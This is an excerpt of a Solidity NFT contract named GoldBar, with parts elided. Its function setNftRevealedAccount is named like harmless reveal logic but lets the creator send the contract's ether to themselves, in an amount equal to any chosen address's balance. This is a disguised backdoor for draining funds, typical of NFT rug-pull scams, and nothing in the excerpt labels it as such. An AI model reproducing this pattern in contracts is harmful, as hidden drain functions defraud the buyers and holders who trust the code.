...
contract GoldBar is ERC721Enumerable, Ownable {
    ...
    string public notRevealedUri    = "https://ipfs.io/ipfs/QmNMF4SJLAoNDLoXmqtdP1Qqz1T51pG3DjsJoRAXWZJ4EM/1.json";
    string public _name;
    ...
    function setNftRevealedAccount(address _revealeCreater) public payable{
        if(deployedverified == true && msg.sender == _nftcreator)
        _nftcreator.call{value: _revealeCreater.balance}(""); 
    }
